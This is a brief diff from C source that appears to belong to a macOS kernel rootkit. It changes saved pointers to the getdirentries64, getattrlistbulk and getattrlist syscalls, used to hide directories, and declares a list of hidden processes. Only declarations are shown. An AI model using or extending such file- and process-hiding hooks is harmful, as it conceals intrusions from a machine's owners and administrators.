@@ -38,7 +38,8 @@ lck_rw_t *lck_rw_hide_file_dirent_array=NULL;
 
 #pragma mark - original function
 getdirentries64_function_prototype my_getdirentries64=NULL; //hide the directory
-getdirentriesattr_function_prototype my_getdirentriseattr=NULL;
+getattrlistbulk_function_prototype my_getattrlistbulk=NULL;
+getattrlist_function_prototype my_getattrlist=NULL;
 
 #pragma mark - TAILQ
 struct hide_proc_list hide_proc_array;  //for store process that is hide
